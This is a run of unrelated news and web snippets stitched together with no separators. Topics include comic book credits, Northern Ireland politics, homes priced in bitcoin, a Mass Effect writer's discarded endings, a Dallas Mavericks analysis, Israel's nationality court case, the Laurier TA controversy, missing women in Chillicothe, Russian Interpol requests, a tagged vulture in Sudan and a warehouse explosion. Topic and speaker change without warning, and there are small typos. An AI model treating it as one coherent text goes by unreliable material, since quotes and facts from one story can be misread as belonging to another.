This character is not the trenchcoat wearing man of mystery who shares the Mr. E name, but a man called Nathan Ellery (as later revealed in #7).Wein and Wrightson's departure from the book (issues #10 and #13 respectively) led others to take over creative duties. Nestor Redondo penciled all but the last issue of the series. (Ernie Chua penciled #24.) David Michelinie wrote #14-18 and #21-22, while Gerry Conway wrote #19-20 and #23. Conway also provided the plot for #24, with David Kraft scripting the issue.
Minister for Foreign Affairs Eamon Gilmore's declaration that the Republic needs to acknowledge Unionist charges that it did not do enough to combat the IRA has been sharply criticised by Sinn Féin.
Speaking in Glasgow tonight, Sinn Féin Newry and Armagh MP, Mr Conor Murphy said a similar speech would never have “come out of” the Department of Foreign Affairs a decade ago.
Much of the speech made by Mr Gilmore to the British-Irish Association, made in Cambridge ten days ago, ‘had been contentious,' Mr Murphy complained.
“Perhaps there isn't the same dialogue between the Department of Foreign Affairs and political parties that there was at the height of the negotiations (in the 1990s).
“I doubt if a type of speech like that would have come out of the Department of Foreign Affairs ten years ago, because I think it was quite clearly unhelpful in large parts,” he said.
The Irish Government should, he said, be involved in a truth and reconciliation process, particularly over attacks in the Republic “which clearly had the hand of British intelligence”.
Meanwhile, he noted that the Smithwick Inquiry is “testing theories” that members of the Garda Síochana colluded in the IRA killings of senior RUC offiíers after they left a meeting in Dundalk.
Both Mr Murphy and Northern Ireland Justice Minister, Mr David Ford agreed that the Irish and British governments should be involved in the talks now being led by ex-US diplomat, Richard Haass.
“At some point, if we are looking at the past, we must have the involvement of the two governments,” Mr Ford, since “they are guarantors of the past and were players”.
Northern Ireland Secretary of State, Theresa Villiers, the Sinn Féin MP told the meeting, “is being extremely unhelpful in trying to set parameters for the Haass talks”.
Two years ago, her predecessor, Owen Paterson had been “very disparaging” about the prospect “of having foreigners coming in” to tell the British Government how to deal with the past.
“Now we have Richard Haass, but we have the British Government not participating,” he said, “If we are going to deal with the legacy of the past it has to involve both governments and all parties.”
The contributions were made by the two men when they appeared at a fringe meeting at the Liberal Democrats' annual conference hosted by the peace and reconciliation group, CHAMP.
Members of the Orange Order and the Ulster Volunteer Force combined to cause Northern Ireland's summer of street trouble, Mr Ford told the gathering.
“Elements of the Orange Order and their fellow-travellers in the Unionist paramilitaries,who were trying to stretch the police, didn't succeed because of mutual aid (from British police forces),” he said.
Later, Mr Murphy commented that the trouble of the summer had been “almost all confined to Belfast and surrounding areas and it is orchestrated”.
“I am glad that people here have called it as it is, because you don't hear that enough at home. You hear a lot of pussy-footing about and excuses,” he told the CHAMP event.
“This is the UVF, in association with elements of the Orange Order, and suffering a lack of any leadership and excuses being given to them by political Unionism,” he went on.
In South Armagh, the PSNI “now have a very good relationship” with the community and “I wouldn't have thought that that was possible five years ago and that I would be saying that”.
“People are orchestrating for political reasons a sense of conflict and a sense of grievance and then they can't control it when it kicks off,” he said.
“People can hide behind making excuses,” he went on, adding, that saying that people are “hard done by” will “always” offer comfort to those who were involved.
Meanwhile, Mr Terry Spence of the Northern Ireland's Police Federation said 1,000 extra police officers must be recruite, warning that a fifth of all front-line officers have been injured.
The lake house at the very edge of California's Joshua Tree National Park has an in-ground pool, sprawling mountain views and a steady vacation rental history. And for just under 32 bitcoins, it could be all yours.
The past few months have been a wild ride for the cryptocurrency once used largely in the digital black market. Valued at less than a dime in the years following its invention in 2008, Bitcoin's worth skyrocketed to over $19,000 in recent months after slowly rising for the better part of a decade. To put the currency's dramatic rise into perspective, consider that 10,000 bitcoins — the amount needed to buy a couple pizzas in 2010 — are currently more than enough to buy a couple pizza franchises. Now that Bitcoin owners can buy laptops, space flights and pretty much anything from Overstock.com with the cryptocurrency, some homeowners want in, too.
“It's just crazy what's going on,” Michael McCrae says, who hopes the listing for 42871 Beato Drive, his Indio, Calif., lake house, will attract buyers with some of the newfound digital wealth. His asking price is $599,000 — or the equivalent in bitcoin.

He's not alone. From a $219,888 Las Vegas townhouse to a nearly $5 million Miami beach house, there are plenty of properties you can purchase with Bitcoin. Some sales have already taken place: In 2014, a Lake Tahoe, Calif. estate sold for 2,739 bitcoins — the equivalent of $1.6 million at the time, and similar listings have been reported in Florida and Texas, though the details of these are scarcer.
Should a Bitcoin buyer appear, McCrae faces some obstacles. The homeowner says he is researching the tax implications of selling for bitcoins and seeking an escrow service that has handled Bitcoin home sales before. He adds that he will probably charge a 5% premium on the sale to cover extra costs. Then there is the matter translating the price of a $599,000 house to a digital currency with a value almost constantly in flux.
Bitcoin's volatility does not naturally lend itself to a purchase where the average mortgage closing, according to Ellie Mae, takes around 42 days. In the past 42 days, the price of one bitcoin increased by just over 171%.
Using bitcoins to buy a house is legal, but it isn't easy, says Josias N. Dewey, a Miami real estate lawyer who has authored several publications on blockchain currencies.
“The bottom line is there's nothing illegal or improper about effectively trading your home for a certain amount of Bitcoin,” Dewey says. “There are practical obstacles that make that challenging, but not impossible.”
Many title companies and other real estate service providers, Dewey says, are unfamiliar with Bitcoin best practices and do not want to be liable for custody of bitcoins. “It's going to be awhile before title companies are comfortable handling virtual currency,” Dewey says. “Until then, you might find it is difficult to find title insurance.”
Some real estate agents have resorted to converting bitcoin to cash, then back again to close sales. In September, a Kuper Sotheby's press release credited Austin-based agent Sheryl Lowe with facilitating the first Bitcoin home sale in Texas. Since then, Lowe says she has worked as the buyer's agent in three more sales.
Lowe says her contracts specify the price of the home in a dollar amount, and her buyers liquidate their cryptocurrency before entering into a deal. This guarantees the seller will receive the U.S. currency detailed in the contract, no matter how Bitcoin's value may change. If the seller wants that wealth in bitcoins, they must convert the money back to the digital currency following the sale, Lowe says.
Lowe adds her clients are mostly young homebuyers who want to convert their newly-gained Bitcoin wealth to real estate. “They're millennials who started in Bitcoin in the very early years,” Lowe says. “It's very obvious when you say that their fortune has been from Bitcoin.”
According to The Wall Street Journal, the home in Lake Tahoe that was sold for Bitcoin was handled by BitPay, a payment processor similar to PayPal. If the buyer and seller agree on trading Bitcoin for the house, the seller starts the process by issuing an invoice. The buyer must then complete the exchange within a 15 minute window, during which time BitPay guarantees the bitcoin-to-dollar exchange rate set at the start, the Journal said.
Lowe's takeaway from her transactions? Everyone involved in a Bitcoin transaction needs to understand the process.
“I think they need to really educate themselves,” Lowe says. “I'm not talking just 15 minutes on the internet, I'm saying talking with people on their team, the title companies, the lawyers, whoever closes their escrow.”
“You can't just slap on an ad saying, ‘ask me about bitcoin,'” Lowe adds.
A Cambridge fire captain accidentally shot himself in the hip at the East Cambridge fire station on Tuesday, The Boston Globe reports.
The unnamed captain, who has been on the force for nearly 30 years, was attempting to transfer his personal firearm and its holster from his jacket pocket to his belt when it went off.
The incident occurred in a stairwell and no one else was hurt.
He was hospitalized for two days, though his injuries did not require surgery. Now he is on sick leave as he recovers.
Though the captain was licensed to carry the gun, Assistant Chief Gerard E. Mahoney told The Globe that he should not have had it in the station. Mahoney described the shooting as a “freak accident.''

The captain has not been disciplined, but Cambridge police and the city's Personnel Department are investigating the incident.

CTC Staff Releases California Active Transportation Program List
The California Transportation Commission has released a list of recommended projects that could get funding from the state's Active Transportation Program. The ATP is a new statewide grant program that funds bicycle and pedestrian improvements throughout California. The list is expected to be approved by the full CTC at its August 20 meeting.
Under the ATP, the CTC is preparing to distribute $221 million for projects and programs in two categories: a statewide competition and a separate competition for small rural and urban projects. A third category of funds will be distributed later this year through the state's largest Metropolitan Planning Organizations (MPOs) (more on that below).
The $221 million for the first two categories will be matched by another $207 million in local matching funds, yielding a total of $426 million in bike and pedestrian projects that will get the green light in the first two-year funding round. The 145 successful applications include 124 statewide projects [PDF] and 21 small rural and urban projects [PDF].
Here are the types of projects that would be funded:
$57 million in bike projects and plans
$119 million for 91 Safe Routes to Schools grants, 81 in the statewide category and 13 in small urban/rural category. Of the 91, 53 include non-infrastructure programs
110 of the projects ($189 million worth) directly benefit disadvantaged communities at least partially
Not surprisingly, the ATP received for more applications than it was able to fund. After all, $207 million is a drop in the bucket compared to the billions available for state highways.
“There was a very high standard for the projects, and unfortunately there were a lot of good projects that just didn't get funded,” said Jeanie Ward-Waller of Safe Routes to Schools National Partnership, which has been active in educating jurisdictions about funding criteria and how to apply. “There just wasn't enough money to go around.”
After a quick perusal of the list, we did not see very many of the bike and pedestrian projects L.A. Metro withdrew funds from last spring, but they could still receive funding through the ATP regional categories.
Under that program, $147 million will be distributed among the nine largest California MPOs: Bay Area, Fresno, Sacramento, San Diego, Southern California, San Jose, Stanislaus, Tulare, and Kern regions. The MPOs are required to submit their project funding requests to Caltrans by November. Many of the projects that did not make this first list could still be funded regionally, if they meet the criteria of their MPO and are chosen for the regional list.
Meanwhile, the ATP guidelines are due to be revised next spring, and the revision process will start with a series of public workshops this fall.

[7-Star Lore]
A proud king from a faraway land, his intellect and cunning in battle are legendary in their own right. Despite his loose way of speaking, he's actually a conservative man at heart who looked out for the welfare of his nation. He's quite well-known as a hard-working man, and he has taken the opportunity of an adventure in the new world to update his well-worn personal dictionary. His exclamations of surprise at what he has found so far have become commonplace by now, and one is left to wonder what else couldn't possibly surprise him...
[Omni Lore]
A proud king from a faraway land, his intellect and cunning in battle are legendary in their own right. His newfound adventures led him to add more entries to his dictionary for familiar words that he had rediscovered, such as "Fallen Gods" and "Summoners." Such marvels! Such wonders! He privately contemplated the fate of his own kingdom if matters were to be the same. Magic, after all, was an uncertain thing. Of course, the wandering king had to get home first, and that would be another story in itself...
Drew Karpyshyn, the lead writer on Mass Effect and Mass Effect 2, recently spoke about some of the ideas for the conclusion to the Mass Effect trilogy that were considered but ultimately discarded.
The ending of Mass Effect 3, and by extension the entire Mass Effect trilogy, is what you might generously describe as not-universally-popular. I didn't hate it, although my judgment was admittedly blurred somewhat by the emotional impact of the final, ultimate end to Commander Shepard's story, but it sure wasn't the best wrap-up ever, and even now I'm not entirely clear as to what happened, or why.
It is what it is, but as revealed by Drew Karpyshyn, the lead writer on the first two Mass Effect games, it could've been something entirely different. In a lengthy and very interesting interview with Videogame Sophistry on AM 640 in Toronto, Karpyshyn talked about a few of the trilogy-ending scenarios that were kicked around while he was still on the job.
"Some of the ideas are a little bit wacky, a little bit crazy," he said. "There was at one point some ideas that maybe Shepard was actually an alien and didn't know it, but we thought that was maybe a little too close to Revan [of Star Wars: Knights of the Old Republic]. At one point we thought, well, maybe at some point Shepard gets his essence transferred into some kind of machine, becomes sort of a cyborg and becomes sort of a bridge between organic and synthetic life."
Karpyshyn also touched on "dark energy," a concept that was introduced in Mass Effect 2 but ultimately never went anywhere. "One of the things we considered is that maybe dark energy is something that only organics can access for various techo-science magic reasons, we hadn't necessarily got into that yet. Maybe using this dark energy was having sort of a ripple effect on, for want of a better term, the space-time continuum," he said. "The Reapers kept wiping out organic life because organics would eventually evolve to where they were using biotics and dark energy, and that was an entropic effect that potentially was going to hasten the end of the universe. And being immortal beings, that is something they did not want to see."
"Then we thought, well, let's take it to the next level, maybe the Reapers are looking at a way to stop this. Maybe there's an inevitable descent into the opposite of the big bang, like the big crunch, the end of the universe, and they realize that the only way to stop it is through using biotics, and since they can't do it, that's sort of why they keep rebuilding society. They're trying to find the perfect group to use biotics," he continued. "The Asari were close but they weren't quite right, the Proteans maybe were close, and they kept trying again and again, where all of it's sort of a giant experiment, as they're trying to find the right mix of mental fortitude and biotic ability and whatever else in the genetic code that allows a particular species to use biotics to stop the end of the universe, or maybe ascend into Reaperhood and still keep this biotic power."
They're interesting and potentially solid ideas, but Karpyshyn cautioned daydreaming fans that they're a long way from fully-cooked and likely would've ended up a disappointment for some people anyway. "[Fans] hear a couple of things they like and in their minds, they add in all the details that they specifically want, and they talk about how awesome it is," he said. "And I think it's because people are basically hopeful, and we want it to be great, and so we imagine it to be exactly what we want it to be, but nothing ever is exactly what we want it to be... I'm a little leery about going into too much detail because whatever we came up with, it probably wouldn't have been what people imagine it would be."

The Mavericks pride themselves on being a veteran team, especially toward the top of the depth chart. And while it's not easy to quantify exactly how “experience” helps a team win — at least in terms of stats — we don't need stats to do it this season. We're seeing it play out right in front of us.
#DirkWeek Win tickets, autographed memorabilia, or a meet-and-greet with the man himself! Find out how
Dirk Nowitzki is red-hot to begin the 2015-16 campaign, leading the team in scoring at 17.0 points per game with shooting splits that boggle the mind. He's shooting 51.3 percent from the field, 50.0 percent from three-point land, and 93.3 percent from the free throw line.
Arguably the biggest contributing factor to the German's torrid start, aside from the obvious stuff, is who he's playing with and how this team has come together. Dallas has plenty of young talent coming off the bench, but it's the veteran-laden top of the rotation that has aided Nowitzki's blistering first two weeks. The Mavericks run an offense designed to create mismatches all over the floor, but that only works well if the ball-handlers can recognize and attack of those situations. Deron Williams, J.J. Barea, Raymond Felton, and Devin Harris all know how and where to get Nowitzki the ball, and the German has taken advantage of those opportunities thus far.
Here's an example from the Mavs' win against the Lakers last Sunday. (Nowitzki scored 25 points in that game on 10-of-13 shooting.) In the play below, the Lakers defenders switch when Dirk sets a ball-screen for Barea.
It literally takes the Mavericks one second to realize what they must do. Barea immediately sees that Nowitzki is guarded by the smaller Lou Williams, and Nowitzki motions to send the ball over to Chandler Parsons on the opposite wing and makes for the low block so Parsons can get him an entry pass.
And here's what Nowitzki was able to do in that matchup.
Earlier in his career, Nowitzki was most dangerous when he faced up a big man. But as he progressed and evolved as a player, he became adept in the post and used his size and shot to punish smaller defenders who switched onto him. Dallas hasn't always been able to get him the rock in those situations since Jason Kidd and Jason Terry left the team following the 2012 season. Players like Monta Ellis and Darren Collison were good at attacking big men after a switch, but they weren't always able to take advantage of a smaller guy matched up on Nowitzki.
Here's another example. This time it's Harris who recognizes the mismatch and feeds Dirk in the post, and he eventually hits a fadeaway over Lance Stephenson.
Nowitzki is still able to put the ball on the floor to beat big men, though, especially when it's either a center or a power forward who doesn't have very good foot speed. Most big guys simply aren't used to defending far away from the rim, and they certainly aren't used to playing against 7-footers who can take them off the bounce. Here, Nowitzki beats DeAndre Jordan with a pump fake and drive to the bucket.
The easiest solution to not being beat off the bounce is to back off of your man, but Nowitzki is such a good shooter that if you don't play him tight, he's going to burn you. Roy Hibbert learned that lesson.
And just for the heck of it, here's a beautiful trailing three with a majestic arc so high that the ball exits the frame. Note, too, that after playing with Nowitzki for two seasons, Tyson Chandler knows exactly what's coming, but even he can't stop it.
The thing all five of these plays have in common is not only did the Mavs put their superstar in a position to succeed, but the guards recognized those mismatches right away and got him the ball in a good spot. Then, once Nowitzki established his position in isolation, they spaced the floor well so he couldn't be double-teamed.
It isn't just the guards generating good looks for Nowitzki. Big man Zaza Pachulia is lending an assist, as well, even though his contributions won't show up in the box score. Pachulia has cleared room for Dirk jumpers all season long by sealing off his defenders with a screen at the top of the arc. Take this play against Anthony Davis, for example. Pachulia made a similar play earlier in the game as well, and Nowitzki converted both chances.
On this play, he's seeking out Dirk's defender like a pulling guard would on a power toss play in the NFL. Pachulia seeks and effectively destroys his opponent, giving Nowitzki the freedom to hit a shot he's made 1,000 times before.
Little things like that — reading defenses, noticing mismatches, and feeding the star the ball when and where he wants it — go a long way in an offense. Nowitzki has been a superior scoring talent basically since he set foot on an NBA floor, but it takes quality guard play to force action to him when he has the advantage. The Mavs have that talent on the perimeter this season, and it shows: A different player got him the ball in each of those plays above. And the final play — the screen by Pachulia — shows the Mavs have high-IQ, unselfish players all over the depth chart.
It will be interesting to see what happens once Chandler Parsons returns to playing his normal 30-plus minutes. Parsons is also capable of attacking matchups, and the Mavericks will be capable of causing all sorts of challenges for opponents when Dirk and Parsons team up in the two-man game. Modern defenses almost want to switch, but a combination like Parsons and Nowitzki will prevent them from doing so because it will always result in a Dallas advantage.
Automakers have a reputation for building full-size versions of their cars out of Lego.
In the past we have seen a full-size Lego 911 RSR at the 24 Hours of Le Mans and a full-size Ferrari F1 car at the Australian Grand Prix.
Now, it seems as though Porsche (or a hardworking enthusiast) has created another full size replica 911. This time, the model is the 911 GT3 RS finished in a beautiful shade of orange.
Porsche 911 GT3 RS Lego Car 1 of 7
The car was spotted on display at the Mall of Scandinavia in Stockholm, Sweden by our reader Rani Patrous.
Not much information is available regarding the recreation. We do know, however, that Lego and Porsche will be releasing a Lego Technic set for the GT3 RS this year, so it could possibly be a tie-in with that.
Nevertheless, the detail put into the model is stunning. The car is just about as accurate as you can get using Lego.

A group of Jews and Arabs are fighting in the Israeli courts to be recognized as "Israelis," a nationality currently denied them, in a case that officials fear may threaten the country's self-declared status as a Jewish state.
Israel refused to recognize an Israeli nationality at the country's establishment in 1948, making an unusual distinction between "citizenship" and "nationality." Although all Israelis qualify as "citizens of Israel," the state is defined as belonging to the "Jewish nation," meaning not only the 5.6 million Israeli Jews but also more than 7 million Jews in the diaspora.
Critics say the special status of Jewish nationality has been a way to undermine the citizenship rights of non-Jews in Israel, especially the fifth of the population who are Arab. Some 30 laws in Israel specifically privilege Jews, including in the areas of immigration rights, naturalization, access to land, and employment.
Arab leaders have also long complained that indications of “Arab” nationality on ID cards make it easy for police and government officials to target Arab citizens for harsher treatment.
The Interior Ministry has adopted more than 130 possible nationalities for Israeli citizens, most of them defined in religious or ethnic terms, with "Jewish" and "Arab" being the main categories.
The group's legal case is being heard by the supreme court after a district judge rejected their petition two years ago, backing the state's position that there is no Israeli nation.
The head of the campaign for Israeli nationality, Uzi Ornan, a retired linguistics professor, said: "It is absurd that Israel, which recognizes dozens of different nationalities, refuses to recognize the one nationality it is supposed to represent."
The government opposes the case, claiming that the campaign's real goal is to "undermine the state's infrastructure" – a presumed reference to laws and official institutions that ensure Jewish citizens enjoy a privileged status in Israel.
Ornan, 86, said that denying a common Israeli nationality was the linchpin of state-sanctioned discrimination against the Arab population.
"There are even two laws – the Law of Return for Jews and the Citizenship Law for Arabs – that determine how you belong to the state," he said. "What kind of democracy divides its citizens into two kinds?"
Yoel Harshefi, a lawyer supporting Ornan, said the Interior Ministry had resorted to creating national groups with no legal recognition outside Israel, such as "Arab" or "unknown," to avoid recognizing an Israeli nationality.
In official documents most Israelis are classified as "Jewish" or "Arab," but immigrants whose status as Jews is questioned by the Israeli rabbinate, including more than 300,000 arrivals from the former Soviet Union, are typically registered according to their country of origin.
"Imagine the uproar in Jewish communities in the United States, Britain, or France, if the authorities there tried to classify their citizens as ‘Jewish' or ‘Christian,'" said Ornan.
The professor, who lives close to Haifa, launched his legal action after the Interior Ministry refused to change his nationality to "Israeli" in 2000. An online petition declaring "I am an Israeli" has attracted several thousand signatures.
Ornan has been joined in his action by 20 other public figures, including former government minister Shulamit Aloni. Several members have been registered with unusual nationalities such as "Russian," "Buddhist," "Georgian," and "Burmese."
Two Arabs are party to the case, including Adel Kadaan, who courted controversy in the 1990s by waging a lengthy legal action to be allowed to live in one of several hundred communities in Israel open only to Jews.
Uri Avnery, a peace activist and former member of the parliament, said the current nationality system gives Jews living abroad a far greater stake in Israel than its 1.3 million Arab citizens.
"The state of Israel cannot recognize an ‘Israeli' nation because it is the state of the ‘Jewish' nation … it belongs to the Jews of Brooklyn, Budapest, and Buenos Aires, even though these consider themselves as belonging to the American, Hungarian, or Argentine nations."
International Zionist organizations representing the diaspora, such as the Jewish National Fund and the Jewish Agency, are given in Israeli law a special, quasi-governmental role, especially in relation to immigration and control over large areas of Israeli territory for the settlement of Jews only.
Ornan said the lack of a common nationality violated Israel's Declaration of Independence, which says the state will "uphold the full social and political equality of all its citizens, without distinction of religion, race, or sex."
Indications of nationality on ID cards carried by Israelis made it easy for officials to discriminate against Arab citizens, he added.
The government has countered that the nationality section on ID cards was phased out from 2000 – after the Interior Ministry, which was run by a religious party at the time, objected to a court order requiring it to identify non-Orthodox Jews as "Jewish" on the cards.
However, Ornan said any official could instantly tell if he was looking at the card of a Jew or Arab because the date of birth on the IDs of Jews was given according to the Hebrew calendar. In addition, the ID of an Arab, unlike a Jew, included the grandfather's name.
"Flash your ID card and whatever government clerk is sitting across from you immediately knows which ‘clan' you belong to, and can refer you to those best suited to ‘handle your kind,'" Ornan said.
The distinction between Jewish and Arab nationalities is also shown on Interior Ministry records used to make important decisions about personal status issues such as marriage, divorce, and death, which are dealt with on entirely sectarian terms.
Only Israelis from the same religious group, for example, are allowed to marry inside Israel – otherwise they are forced to wed abroad – and cemeteries are separated according to religious belonging.
Some of those who have joined the campaign complain that it has damaged their business interests. One Druze member, Carmel Wahaba, said he had lost the chance to establish an import-export company in France because officials there refused to accept documents stating his nationality as "Druze" rather than "Israeli."
The group also said it hoped to expose a verbal sleight of hand that intentionally mistranslates the Hebrew term "Israeli citizenship" on the country's passports as "Israeli nationality" in English to avoid problems with foreign border officials.
B. Michael, a commentator for Yedioth Aharonoth, Israel's most popular newspaper, has observed: "We are all Israeli nationals – but only abroad."
The campaign, however, is likely to face an uphill struggle in the courts.
A similar legal suit brought by a Tel Aviv psychologist, George Tamrin, failed in 1970. Shimon Agranat, head of the supreme court at the time, ruled: "There is no Israeli nation separate from the Jewish people. … The Jewish people are composed not only of those residing in Israel but also of Diaspora Jewries."
That view was echoed by the district court in 2008 when it heard Ornan's case.
The judges in the supreme court, which held the first appeal hearing last month, indicated that they too were likely to be unsympathetic. Justice Uzi Fogelman said: "The question is whether or not the court is the right place to solve this problem."

Twenty faculty members at Wilfrid Laurier University signed an open letter in support of two colleagues who criticized teaching assistant Lindsay Shepherd for showing a video clip that featured a controversial figure in her tutorial. The letter, published Monday on an academic listserv for the Canadian Communication Association, underscored the supervising professor's academic freedom to decide what material is presented to supplement lectures.

“While the ‘free speech' of a single individual has dominated discussion surrounding this situation, ‘academic freedom' is also a decisive term in this context,” the letter said. “We reject efforts of those who have seized this episode as a strategic opportunity to disparage disciplines and scholars with commitments to improving social and economic equality within universities and in society at large.” Communication studies department professor Nathan Rambukkana, Shepherd's supervisor; Herbert Pimlott, co-ordinator for the masters program that Shepherd is enrolled in; and Adria Joel, acting manager for Gendered Violence Prevention and Support, were secretly recorded by the 23-year-old during a subsequent meeting.

Shepherd was criticized by the three staff members for failing to condemn the views of University of Toronto professor Jordan Peterson, who has refused to use gender-neutral pronouns. She aired a short clip of a TVO debate featuring the professor as part of a communications tutorial to “contextualize” the complexities of grammar, she said in the clip. “The thing is, can you shield people from those ideas? Am I supposed to comfort them and make sure they are insulated away from this? . . . To me that is so against what a university is about,” Shepherd can be heard saying in the recording, adding she disagreed with Peterson. In the open letter, faculty and staff from the communications studies department responded to the claim, which has been hotly debated on social media. “Charges that our program shelters students from real-world issues or fosters classrooms inhospitable to discussing contentious issues from different vantage points seem to us simply preposterous,” the letter said. “Likewise, commentators who characterize our students as millennial ‘snowflakes' not only insult our students but also paint a dramatically inaccurate representation of what happens in our classrooms.”
The university apologized to Shepherd last month after she discreetly recorded the meeting with the staff members and released it publicly. The two professors who attended the meeting did not respond to requests for comment from the Star.

Also on Monday, Laurier president Deborah MacLatchy confirmed in a statement that no formal complaint or informal concern was ever filed in relation to Shepherd's class. However, a university spokesperson said it was a later discussion among students about the video that led to the meeting with Shepherd. MacLatchy's statement, issued following the faculty's open letter, detailed the outcome of an independent factfinder's investigation into the incident and outlined ways in which the university plans to improve handling future cases. “We are here to put an end to the ongoing politicization of this issue,” MacLatchy said. In addition to the review of relevant university policies, including that for “Gendered and Sexual Violence,” Laurier also plans to standardize training and support for teaching assistants and supervisors. The university is also introducing a 13-member Task Force on Freedom of Expression, with names to be announced later this week. The members will work from January until March 2018 to develop a statement on freedom of expression that balances academic freedom, freedom of speech, and Laurier's mission, vision, and values. The university declined to comment on the open letter, or detail whether the two faculty members would face discipline. “It's really unacceptable to invent a complaint, and bring me into a meeting and accuse me of something they had no understanding of, and to abuse their power in that way,” Shepherd said. “It's weird to not address the fact that you made up a fraudulent complaint. I think they need to address it.” On Tuesday, Shepherd said on Twitter that she will be a teaching assistant next semester for one of the faculty signees of the open letter.

Like the five other women who in recent years went missing or were found dead in the Chillicothe area, Tiffany Sayre struggled. All had battled drug addiction, according to authorities, and all were known to have frequented the same spots where the drug and sex trades thrived. Her family hoped that the 26-year-old Sayre would tire of such a life and come to terms with her inner demons. She never got the chance.
Like the five other women who in recent years went missing or were found dead in the Chillicothe area, Tiffany Sayre struggled.
All had battled drug addiction, according to authorities, and all were known to have frequented the same spots where the drug and sex trades thrived.
Her family hoped that the 26-year-old Sayre would tire of such a life and come to terms with her inner demons.
She never got the chance.
She went missing in May 2015; the next month, her body was found. Her death, blamed on a drug overdose, was ruled a homicide.
"I need to know why," said her aunt, Shelly Hehr.
"Somebody knows something. Somebody knows what happened to her."
The quest for answers, for closure, inspired Hehr, along with relatives of the other victims, to take part in a documentary series whose premiere is set for tonight on the Investigation Discovery network.
"The Vanishing Women," with six weekly installments, explores the tragic lives of the women and documents the ongoing law-enforcement investigations of their disappearances and slayings - which have raised fears of a serial killer in the Ross County city, about an hour south of Columbus.
The women, investigators say, knew one another:
• Sayre, whose body was found June 20, 2015.
• Timberly D. Claytor, 38, found May 29, 2015, in an abandoned home near Massieville. She was shot three times in the head. A man accused of killing her - the only arrest in the cases - is scheduled to stand trial next month.
• Shasta Himelrick, 20, found in January 2015. A coroner deemed her death a suicide by drowning, although relatives think she was killed.
• Tameka Lynch, 30, found in May 2014. Her death was ruled a drug overdose.
• Wanda J. Lemons, 39, last seen in October 2014.
• Charlotte E. Trego, 29, missing since May 2014.
It was after the disappearance of Sayre, the sixth victim, that the Chillicothe Police Department and Ross County sheriff's office formed a task force and enlisted the help of state and federal agencies.
Alhough not every death was called a homicide, authorities think foul play was involved in each - as the bodies were dumped in or near creeks and rivers, where the remains were found.
"We continue to investigate each of these as a homicide, given the fact that criminal offenses occurred," police detective Bud Lytle said. "We're fully aware that the bodies were moved after they were deceased."
Investigation Discovery is owned by Discovery Communications, which also owns the sister networks Discovery Channel, Animal Planet and TLC. After seeing the story of the Chillicothe women in the national media, the outlet partnered with Sirens Media to document the mystery.
"We didn't want to swoop in with a giant crew," said Jeanie Vink, an executive producer.
"We wanted to be intimate and respectful for people who are still going through a grieving process."
The long-form, episodic format - similar to that of "Serial" on NPR or "Making a Murderer" on Netflix - represents a departure for the true-crime network, which traditionally produces one-time documentaries, with each case closed at the end.
"That is different for us in terms of hoping people come back week after week, but this story is so gripping," Vink said. "Maybe we'll shake loose some leaves or get them some help in solving the cases."
A network crew remains in Ross County to follow updates, and producers continue to evaluate how to cover the upcoming trial of Jason A. McCrary - who was charged in July after DNA evidence on his shoes linked him to the Claytor slaying, investigators say.
The trial is scheduled to begin July 11, according to Ross County court records.
Investigators don't suspect McCrary in the deaths or disappearances of the other victims.
"The Vanishing Women," Vink said, has a sense of immediacy.
"I think it's relatable," she said. "It sort of shows you that it can happen anywhere."
Hehr, who was interviewed for the series, plans to watch every episode, even though she described the prospect of reliving the experience as "rough."
She occasionally visits her niece's two young daughters, in the custody of their grandmother.
Every time she sees them, she said, she is reminded of Sayre - whom she remembers as unfailingly kind and smart despite her troubles.
Hehr struggles with the thought that the girls will grow up without knowing what happened to their mother; she hopes, for their sake, that someone is prompted by the documentary to come forward with information.
"I think about it every day," she said. "I keep trying to think and figure it out."
Her niece, she said, was a good, honest person.
"She was always happy. She was very loving."

Russia is facing a showdown with European leaders over claims it is "abusing" the international "red notice" system for arresting criminals, in an attempt to silence critics of Vladimir Putin.
Documents seen by the Telegraph show that Moscow has issued a fresh request to Interpol for the "arrest and extradition" of Bill Browder, a prominent campaigner for sanctions against Russian officials involved in human rights abuses.
The disclosure comes amid growing concern in Europe about the use of red notices by authoritarian leaders cracking down on their critics.
This week Angela Merkel warned President Erdoğan of Turkey not to "misuse" Interpol after the system was used by Ankara to arrest a Turkish journalist in Spain.
A Council of Europe report this year cited earlier Russian attempts to seek Mr Browder's arrest through Interpol as an example of alleged "abuses" of the system by states pursuing "political goals".
Bernd Fabritius, the special rapporteur who wrote the report, told the Telegraph that the European human rights body had been clear that Interpol should "block repeated red notices" and that he would "take action" if Interpol had allowed the latest request.
Previous attempts by Russia to issue a red notice for Mr Browder through Interpol have been blocked amid a public outcry about the use of the international policing network for political purposes - although the recent appointment of a Russian police official as vice president of the body may help Moscow to press its case.
The avian discovery was made in Kereinek, a town in the Darfur region of western Sudan, Israeli media have reported.
Sudanese officials are said to have concluded that the bird was a secret agent after discovering it was fitted with GPS and solar-powered equipment capable of broadcasting images via satellite, according to Haaretz newspaper, which cited an Egyptian website, El Balad.
The vulture also had a tag attached to its leg with "Israel Nature Service" and "Hebrew University, Jerusalem", leading to accusations that it was on an Israeli surveillance mission.
The reports follow allegations by Sudan that Israel carried out the bombing of a munitions depot near the Sudanese capital, Khartoum, in October, after jamming the country's radar defences.
Israel has made no comment on the raid, which left two people dead. The arms depot was said to be supplying weapons to the Palestinian militant group Hamas in Gaza.
Israeli officials have acknowledged that the bird, which can fly up to 375 miles a day, had been tagged with Israeli equipment but insisted it was being used to study migration patterns.
Ohad Hazofe, an ecologist with the Israel Nature and Parks Authority, told the website, Ynet, that it was one of 100 vultures fitted in October with a GPS system equipped to take distance and altitude readings but not surveillance images.
"That's the only way we knew something had happened to the bird – all of a sudden it stopped flying and started travelling on the ground," he said.
A similar discovery in Saudi Arabia last year prompted local media to report that a bird, later identified as a Griffon, had been "arrested" under suspicion of spying as part of a suspected "Zionist plot".
Saudi officials later dismissed the speculation and criticised journalists for jumping to conclusions after accepting Israeli explanations that the bird was part of a migration study.
A powerful explosion at a Mississauga warehouse came without warning on Wednesday morning, injuring a group of firefighters who were trying to make their way inside.
It was just after 4:30 a.m. ET when firefighters were alerted to the fire at an industrial warehouse located at 2797 Thamesgate Dr., just north of Toronto Pearson International Airport.
As the first firefighters on the scene attempted to enter the building, a large explosion caused a wall to collapse, briefly trapping them inside.
Mississauga's deputy fire chief, Greg Laing, told reporters that the responding fire crews were not aware that the building contained explosive materials.
"Normally, fires progress in a certain way and that one did not," Laing said Wednesday afternoon.
"That one went from a building and contents fire emitting smoke, to an instantaneous destruction of the entire building, which we normally only associate with an explosive device that would do something like that."
